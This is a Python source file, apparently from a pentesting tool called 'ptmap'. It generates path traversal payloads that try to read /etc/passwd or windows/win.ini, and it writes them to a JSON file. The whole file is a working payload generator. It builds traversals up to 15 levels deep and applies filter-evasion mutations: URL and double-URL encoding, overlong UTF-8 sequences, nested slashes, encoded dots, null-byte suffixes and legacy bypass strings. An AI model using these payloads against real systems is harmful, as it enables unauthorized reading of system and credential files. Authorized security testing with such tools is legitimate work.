from urllib.parse import quote
from collections import defaultdict
from typing import Callable
from ptmap.cli_setup.logger import logger
import json

TARGET_FILES = {
    "linux": "etc/passwd",
    "windows": "windows/win.ini",
}

LEGACY_BYPASSES = {
    "linux": {
        "..%c1%1c..%c1%1cetc/passwd",
        "%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
    },
    "windows": {
        "..%c1%9c..%c1%9cwindows%c1%9cwin.ini",
        "%c0%ae%c0%ae%c1%9cwindows%c1%9cwin.ini",
    }
}

NULLBYTE_SUFFIXES = (
    "%00",
    "%00.jpg",
    "%00.png",
    "%00.txt",
    "%00.php",
    "%00.html",
)

OVERLONG_MAP = str.maketrans({
    "/": "%c0%af",
    "\\": "%c1%9c",
    ".": "%c0%ae",
})


def urlencode(payload: str) -> str:
    return quote(payload, safe="")


def double_urlencode(payload: str) -> str:
    return urlencode(urlencode(payload))


def overlong_utf8(payload: str) -> str:
    return payload.translate(OVERLONG_MAP)


def encode_dots(payload: str) -> str:
    return payload.replace(".", "%2E")


def nested_slashes(payload: str) -> str:
    return payload.replace("../", "....//").replace("..\\", "....\\\\")


def nullbyte(payload: str) -> set[str]:
    return {payload + suffix for suffix in NULLBYTE_SUFFIXES}


MUTATORS: dict[str, Callable] = {
    "urlencode": urlencode,
    "double_urlencode": double_urlencode,
    "overlong_utf8": overlong_utf8,
    "encode_dots": encode_dots,
    "nested_slashes": nested_slashes,
}

def build_base_payloads(
    target_os: str,
    max_depth: int = 15,
) -> tuple[set[str], str]:

    is_windows = target_os == "windows"
    sep = "\\" if is_windows else "/"
    target = TARGET_FILES[target_os].replace("/", sep)

    traversals = {
        "/" + target if depth == 0
        else f"{'..' + sep}" * depth + target
        for depth in range(0, max_depth + 1)
    }

    return traversals, target


def payload_gen(
    target_os: str = "linux",
    max_depth: int = 10,
    enabled_mutators: list[str] | None = None,
) -> dict[str, list[str]]:

    if target_os not in TARGET_FILES:
        logger(
            f"Supported platforms are: {', '.join(TARGET_FILES)}",
            "info"
        )
        return {}

    enabled_mutators = enabled_mutators or list(MUTATORS)

    payloads: defaultdict[str, set[str]] = defaultdict(set)

    base_payloads, direct_path = build_base_payloads(
        target_os,
        max_depth,
    )

    payloads["traverse"].update(base_payloads)
    payloads["direct_path"].add(direct_path)
    payloads["legacy_bypasses"].update(
        LEGACY_BYPASSES[target_os]
    )

    for payload in base_payloads:

        for mutator_name in enabled_mutators:

            mutator = MUTATORS.get(mutator_name)

            if not mutator:
                continue

            mutated = mutator(payload)

            if mutated != payload:
                payloads[mutator_name].add(mutated)

        payloads["nullbyte"].update(
            nullbyte(payload)
        )

    payloads["nullbyte"].update(
        nullbyte(direct_path)
    )

    return {
        category: sorted(values, reverse=True)
        for category, values in payloads.items()
    }
    
if __name__ == "__main__":

    payloads = payload_gen(
        target_os="linux",
        max_depth=15,
        enabled_mutators=[
            "urlencode",
            "double_urlencode",
            "overlong_utf8",
            "nested_slashes",
            "encode_dots",
        ]
    )

    # print(payloads)
    total = sum(len(v) for v in payloads.values())

    print(f"\nGenerated {total} payloads\n")

    with open("payloads.json", "w") as f:
        json.dump(payloads, f, indent=4)
        
    # for category, values in payloads.items():

    #     print(f"[{category}] ({len(values)})")

    #     for payload in values:
    #         print(payload)
            
    #     print()